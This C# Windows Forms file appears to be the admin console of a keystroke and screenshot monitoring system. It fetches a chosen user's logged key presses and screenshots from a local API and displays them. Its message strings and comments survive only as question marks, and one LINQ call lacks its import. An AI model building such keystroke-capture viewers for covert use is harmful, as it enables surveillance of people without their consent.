using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AdminForm
{


    public partial class Form1 : Form
    {
        private int _currentScreenshotIndex = 0;
        private List<string> _screenshots = new List<string>();

        public Form1()
        {
            InitializeComponent();
        }

        private async void LoadKeyPresses_Click(object sender, EventArgs e)
        {
            if (!int.TryParse(userIdTextBox.Text, out int userId))
            {
                MessageBox.Show("??????? ????????? ID ???????????.");
                return;
            }

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    var response = await client.GetAsync($"http://localhost:5283/api/get-keypresses?userId={userId}");
                    if (response.IsSuccessStatusCode)
                    {
                        var keyPresses = await response.Content.ReadFromJsonAsync<List<KeyPress>>();
                        keyPressListBox.Items.Clear();

                        foreach (var keyPress in keyPresses)
                        {
                            keyPressListBox.Items.Add($"{keyPress.Timestamp}: {keyPress.KeyPressed}");
                        }
                    }
                    else
                    {
                        MessageBox.Show($"???????: {response.ReasonPhrase}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"??????? ???????????: {ex.Message}");
                }
            }
        }

        private async void LoadScreenshots_Click(object sender, EventArgs e)
        {
            if (!int.TryParse(userIdTextBox.Text, out int userId))
            {
                MessageBox.Show("??????? ????????? ID ???????????.");
                return;
            }

            using (HttpClient client = new HttpClient())
            {
                try
                {
                    var response = await client.GetAsync($"http://localhost:5283/api/get-screenshots?userId={userId}");
                    if (response.IsSuccessStatusCode)
                    {
                        var screenshots = await response.Content.ReadFromJsonAsync<List<ScreenshotData>>();
                        _screenshots = screenshots.Select(s => s.ImageData).ToList();
                        _currentScreenshotIndex = 0;

                        if (_screenshots.Count > 0)
                        {
                            ShowScreenshot(_currentScreenshotIndex);
                        }
                        else
                        {
                            MessageBox.Show("????? ??????????.");
                        }
                    }
                    else
                    {
                        MessageBox.Show($"???????: {response.ReasonPhrase}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"??????? ???????????: {ex.Message}");
                }
            }
        }

        private Image ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;

                graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel);
            }

            return destImage;
        }


        private void ShowScreenshot(int index)
        {
            if (_screenshots == null || _screenshots.Count == 0)
            {
                MessageBox.Show("????? ?????????? ??? ????????????.");
                return;
            }

            try
            {
                // ??????????? ???? Base64 ? ????? ??????
                byte[] imageData = Convert.FromBase64String(_screenshots[index]);

                using (var ms = new MemoryStream(imageData))
                {
                    // ????????? ?????????? ? ??????
                    var originalImage = Image.FromStream(ms);

                    // ???????? ?????? ?????????? ?????????? ?? PictureBox
                    var resizedImage = ResizeImage(originalImage, screenshotPictureBox.Width, screenshotPictureBox.Height);

                    // ???????????? ???????? ?????????? ? PictureBox
                    screenshotPictureBox.Image = resizedImage;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"??????? ??? ???????????? ?????????: {ex.Message}");
            }
        }



        public class KeyPress
        {
            public DateTime Timestamp { get; set; }
            public string KeyPressed { get; set; }
        }

        public class ScreenshotData
        {
            public DateTime Timestamp { get; set; }
            public string ImageData { get; set; }
        }

        private void NextScreenshot_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 1) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }

        private void PreviousScreenshot_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 1 + _screenshots.Count) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }

        private void Next10Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 10) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }

        private void Previous10Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 10 + _screenshots.Count) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }

        private void Next100Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex + 100) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }

        private void Previous100Screenshots_Click(object sender, EventArgs e)
        {
            if (_screenshots.Count == 0)
            {
                MessageBox.Show("????? ??????????.");
                return;
            }

            _currentScreenshotIndex = (_currentScreenshotIndex - 100 + _screenshots.Count) % _screenshots.Count;
            ShowScreenshot(_currentScreenshotIndex);
        }
    }

}
